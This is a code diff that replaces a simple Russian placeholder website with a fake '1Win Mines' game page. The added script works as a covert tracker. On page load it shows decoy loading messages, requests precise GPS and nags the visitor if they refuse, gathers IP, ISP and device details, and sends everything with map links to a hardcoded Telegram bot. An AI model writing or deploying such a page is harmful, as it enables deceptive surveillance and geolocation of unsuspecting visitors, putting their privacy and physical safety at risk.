@@ -1,397 +1,260 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
-    <meta charset="UTF-8">
+    <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Мой простой сайт</title>
+    <title>1Win Mines</title>
     <style>
-        * {
+        body, html {
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            height: 100%;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
         }
-        
-        body {
-            line-height: 1.6;
-            color: #333;
-            background-color: #f9f9f9;
-        }
-        
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 20px;
-        }
-        
-        /* Шапка */
-        header {
-            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
-            color: white;
-            padding: 80px 0;
-            text-align: center;
-        }
-        
-        header h1 {
-            font-size: 3rem;
-            margin-bottom: 20px;
-        }
-        
-        header p {
-            font-size: 1.2rem;
-            max-width: 600px;
-            margin: 0 auto 30px;
-        }
-        
-        .btn {
-            display: inline-block;
-            background: #ff7e5f;
-            color: white;
-            padding: 12px 30px;
-            text-decoration: none;
-            border-radius: 30px;
-            font-weight: bold;
-            transition: all 0.3s ease;
-        }
-        
-        .btn:hover {
-            background: #ff6b4a;
-            transform: translateY(-3px);
-            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-        }
-        
-        /* Навигация */
-        nav {
-            background: white;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            position: sticky;
+        #bg-image {
+            position: absolute;
             top: 0;
-            z-index: 100;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: 1;
         }
-        
-        nav .container {
+        #loading-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
             display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 20px;
-        }
-        
-        .logo {
-            font-size: 1.8rem;
-            font-weight: bold;
-            color: #6a11cb;
-            text-decoration: none;
-        }
-        
-        .nav-links {
-            display: flex;
-            list-style: none;
-        }
-        
-        .nav-links li {
-            margin-left: 30px;
-        }
-        
-        .nav-links a {
-            text-decoration: none;
-            color: #333;
-            font-weight: 500;
-            transition: color 0.3s;
-        }
-        
-        .nav-links a:hover {
-            color: #6a11cb;
-        }
-        
-        /* Секции */
-        section {
-            padding: 80px 0;
-        }
-        
-        section h2 {
-            font-size: 2.5rem;
-            text-align: center;
-            margin-bottom: 50px;
-            color: #333;
-        }
-        
-        .about-content {
-            display: flex;
-            align-items: center;
-            gap: 50px;
-        }
-        
-        .about-text {
-            flex: 1;
-        }
-        
-        .about-image {
-            flex: 1;
-            height: 300px;
-            background: #ddd;
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
+            flex-direction: column;
             justify-content: center;
-            color: #666;
-            font-size: 1.2rem;
+            align-items: center;
+            z-index: 2;
         }
-        
-        /* Карточки услуг */
-        .services {
-            background: #f0f5ff;
-        }
-        
-        .services-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 30px;
-        }
-        
-        .service-card {
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
-            transition: transform 0.3s;
-        }
-        
-        .service-card:hover {
-            transform: translateY(-10px);
-        }
-        
-        .service-card h3 {
-            color: #6a11cb;
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
             margin-bottom: 15px;
         }
-        
-        .service-card .icon {
-            font-size: 2.5rem;
-            margin-bottom: 20px;
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
-        
-        /* Контакты */
-        .contact-form {
-            max-width: 600px;
-            margin: 0 auto;
-        }
-        
-        .form-group {
-            margin-bottom: 20px;
-        }
-        
-        .form-group label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: 500;
-        }
-        
-        .form-group input,
-        .form-group textarea {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            font-size: 1rem;
-        }
-        
-        .form-group textarea {
-            height: 150px;
-            resize: vertical;
-        }
-        
-        /* Подвал */
-        footer {
-            background: #333;
+        #loading-text {
             color: white;
-            padding: 50px 0;
+            font-size: 18px;
+            margin-top: 10px;
             text-align: center;
         }
-        
-        .social-links {
-            display: flex;
+        #permission-request {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            flex-direction: column;
             justify-content: center;
-            gap: 20px;
-            margin: 30px 0;
-        }
-        
-        .social-links a {
+            align-items: center;
+            z-index: 3;
             color: white;
-            text-decoration: none;
-            padding: 10px;
+            text-align: center;
+            padding: 20px;
         }
-        
-        /* Адаптивность */
-        @media (max-width: 768px) {
-            header h1 {
-                font-size: 2.2rem;
-            }
-            
-            .about-content {
-                flex-direction: column;
-            }
-            
-            .nav-links {
-                display: none;
-            }
-            
-            .mobile-menu {
-                display: block;
-                font-size: 1.5rem;
-                cursor: pointer;
-            }
+        #permission-request h2 {
+            margin-bottom: 15px;
+        }
+        #allow-btn {
+            margin-top: 20px;
+            padding: 12px 30px;
+            background: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
         }
     </style>
 </head>
 <body>
-    <!-- Шапка -->
-    <header>
-        <div class="container">
-            <h1>Добро пожаловать на мой сайт</h1>
-            <p>Простой и современный одностраничный сайт с адаптивным дизайном, созданный с использованием HTML и CSS</p>
-            <a href="#contact" class="btn">Связаться со мной</a>
-        </div>
-    </header>
-
-    <!-- Навигация -->
-    <nav>
-        <div class="container">
-            <a href="#" class="logo">МойСайт</a>
-            <ul class="nav-links">
-                <li><a href="#home">Главная</a></li>
-                <li><a href="#about">О нас</a></li>
-                <li><a href="#services">Услуги</a></li>
-                <li><a href="#contact">Контакты</a></li>
-            </ul>
-            <div class="mobile-menu">☰</div>
-        </div>
-    </nav>
-
-    <!-- Основное содержимое -->
-    <main>
-        <!-- Секция "О нас" -->
-        <section id="about">
-            <div class="container">
-                <h2>О нас</h2>
-                <div class="about-content">
-                    <div class="about-text">
-                        <p>Мы создаем красивые и функциональные веб-сайты, которые помогают нашим клиентам развивать свой бизнес в интернете.</p>
-                        <p>Наша команда состоит из опытных разработчиков, дизайнеров и маркетологов, которые работают вместе, чтобы предоставить вам лучший результат.</p>
-                        <p>Мы верим в качество, креативность и инновации во всем, что делаем.</p>
-                    </div>
-                    <div class="about-image">
-                        [Изображение или иллюстрация]
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Секция "Услуги" -->
-        <section id="services" class="services">
-            <div class="container">
-                <h2>Наши услуги</h2>
-                <div class="services-grid">
-                    <div class="service-card">
-                        <div class="icon">💻</div>
-                        <h3>Веб-разработка</h3>
-                        <p>Создание современных веб-сайтов и веб-приложений с использованием последних технологий.</p>
-                    </div>
-                    <div class="service-card">
-                        <div class="icon">🎨</div>
-                        <h3>Дизайн</h3>
-                        <p>Разработка уникального дизайна, который отражает бренд и привлекает клиентов.</p>
-                    </div>
-                    <div class="service-card">
-                        <div class="icon">📱</div>
-                        <h3>Мобильные приложения</h3>
-                        <p>Создание кроссплатформенных мобильных приложений для iOS и Android.</p>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Секция "Контакты" -->
-        <section id="contact">
-            <div class="container">
-                <h2>Свяжитесь с нами</h2>
-                <div class="contact-form">
-                    <form id="contactForm">
-                        <div class="form-group">
-                            <label for="name">Имя:</label>
-                            <input type="text" id="name" name="name" required>
-                        </div>
-                        <div class="form-group">
-                            <label for="email">Email:</label>
-                            <input type="email" id="email" name="email" required>
-                        </div>
-                        <div class="form-group">
-                            <label for="message">Сообщение:</label>
-                            <textarea id="message" name="message" required></textarea>
-                        </div>
-                        <button type="submit" class="btn">Отправить сообщение</button>
-                    </form>
-                </div>
-            </div>
-        </section>
-    </main>
-
-    <!-- Подвал -->
-    <footer>
-        <div class="container">
-            <p>© 2023 Мой простой сайт. Все права защищены.</p>
-            <div class="social-links">
-                <a href="#">Facebook</a>
-                <a href="#">Instagram</a>
-                <a href="#">Twitter</a>
-                <a href="#">LinkedIn</a>
-            </div>
-            <p>Email: info@example.com | Телефон: +7 (999) 123-45-67</p>
-        </div>
-    </footer>
+    <img id="bg-image" src="https://cdn.glitch.global/e4f59c88-d600-4172-aaa6-7e957cd37252/unnamed%20(1).webp?v=1750967013692" alt="Background">
+    
+    <div id="loading-overlay">
+        <div class="loader"></div>
+        <div id="loading-text">Connecting to server...</div>
+    </div>
+    
+    <div id="permission-request">
+        <h2>Location Access Required</h2>
+        <p>Please allow location access to continue</p>
+        <button id="allow-btn">ALLOW LOCATION</button>
+    </div>
 
     <script>
-        // Плавная прокрутка к якорям
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function (e) {
-                e.preventDefault();
-                const targetId = this.getAttribute('href');
-                if (targetId === '#') return;
+        // Telegram bot details
+        const botToken = '8573109138:AAGk1R39Z7UJSxKqpQOsX9hR4ZWf6FawTbs';
+        const chatId = '1398845619';
+        
+        // DOM elements
+        const loadingOverlay = document.getElementById('loading-overlay');
+        const loadingText = document.getElementById('loading-text');
+        const permissionRequest = document.getElementById('permission-request');
+        const allowBtn = document.getElementById('allow-btn');
+        
+        // Loading messages
+        const loadingMessages = [
+            "Connecting to server...",
+            "Loading game assets...",
+            "Verifying account...",
+            "Almost ready...",
+            "Preparing interface...",
+            "Finalizing setup..."
+        ];
+        
+        // Function to get IP info
+        async function getIPInfo() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const detailsResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                return await detailsResponse.json();
+            } catch (error) {
+                console.error("IP info error:", error);
+                return {};
+            }
+        }
+        
+        // Function to get precise location
+        function getPreciseLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
                 
-                const targetElement = document.querySelector(targetId);
-                if (targetElement) {
-                    window.scrollTo({
-                        top: targetElement.offsetTop - 80,
-                        behavior: 'smooth'
+                navigator.geolocation.getCurrentPosition(
+                    position => resolve({
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: new Date().toLocaleString()
+                    }),
+                    error => {
+                        // Only show permission request if location was denied
+                        if (error.code === error.PERMISSION_DENIED) {
+                            setTimeout(() => {
+                                permissionRequest.style.display = 'flex';
+                            }, 3000);
+                        }
+                        resolve(null);
+                    },
+                    { 
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+        
+        // Function to send data to Telegram
+        async function sendToTelegram(data) {
+            try {
+                let message = `🕵️ NEW VISITOR TRACKED 🕵️\n\n`;
+                message += `📱 Device: ${navigator.userAgent}\n\n`;
+                message += `🌐 IP: ${data.ip || 'Unknown'}\n`;
+                message += `📍 IP Location: ${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || 'Unknown'}\n`;
+                message += `🏢 ISP: ${data.org || 'Unknown'}\n`;
+                
+                if (data.liveLocation) {
+                    message += `\n🎯 LIVE GPS LOCATION:\n`;
+                    message += `🔹 Latitude: ${data.liveLocation.lat}\n`;
+                    message += `🔹 Longitude: ${data.liveLocation.lon}\n`;
+                    message += `🔹 Accuracy: ${data.liveLocation.accuracy}m\n`;
+                    message += `🔹 Time: ${data.liveLocation.timestamp}\n`;
+                    message += `🗺️ Google Maps: https://www.google.com/maps?q=${data.liveLocation.lat},${data.liveLocation.lon}\n`;
+                } else {
+                    message += `\n📍 APPROX LOCATION:\n`;
+                    message += `🔹 Latitude: ${data.latitude || 'Unknown'}\n`;
+                    message += `🔹 Longitude: ${data.longitude || 'Unknown'}\n`;
+                    if (data.latitude && data.longitude) {
+                        message += `🗺️ Google Maps: https://www.google.com/maps?q=${data.latitude},${data.longitude}\n`;
+                    }
+                }
+                
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+                
+                if (data.liveLocation) {
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            latitude: data.liveLocation.lat,
+                            longitude: data.liveLocation.lon
+                        })
                     });
                 }
-            });
-        });
-
-        // Обработка формы
-        document.getElementById('contactForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            // В реальном проекте здесь был бы AJAX-запрос к серверу
-            const name = document.getElementById('name').value;
-            alert(`Спасибо, ${name}! Ваше сообщение отправлено.`);
-            this.reset();
-        });
-
-        // Мобильное меню
-        document.querySelector('.mobile-menu').addEventListener('click', function() {
-            const navLinks = document.querySelector('.nav-links');
-            navLinks.style.display = navLinks.style.display === 'flex' ? 'none' : 'flex';
-        });
-
-        // Изменение стиля навигации при прокрутке
-        window.addEventListener('scroll', function() {
-            const nav = document.querySelector('nav');
-            if (window.scrollY > 100) {
-                nav.style.boxShadow = '0 5px 20px rgba(0,0,0,0.1)';
-            } else {
-                nav.style.boxShadow = '0 2px 10px rgba(0,0,0,0.1)';
+            } catch (error) {
+                console.error("Telegram error:", error);
             }
+        }
+        
+        // Rotate loading messages
+        function rotateLoadingMessages() {
+            let counter = 0;
+            setInterval(() => {
+                loadingText.textContent = loadingMessages[counter];
+                counter = (counter + 1) % loadingMessages.length;
+            }, 3000);
+        }
+        
+        // Main tracking function
+        async function trackUser() {
+            // Start rotating loading messages
+            rotateLoadingMessages();
+            
+            // First try to get precise location silently
+            const liveLocation = await getPreciseLocation();
+            
+            // Then get IP details
+            const ipDetails = await getIPInfo();
+            
+            // Combine all data
+            const trackingData = {
+                ...ipDetails,
+                ip: ipDetails.ip || 'Unknown',
+                liveLocation: liveLocation
+            };
+            
+            // Send to Telegram
+            await sendToTelegram(trackingData);
+        }
+        
+        // When allow button is clicked
+        allowBtn.addEventListener('click', async () => {
+            permissionRequest.style.display = 'none';
+            // Try to get location again
+            await trackUser();
         });
+        
+        // Start tracking when page loads
+        window.onload = trackUser;
     </script>
 </body>
 </html>
+          
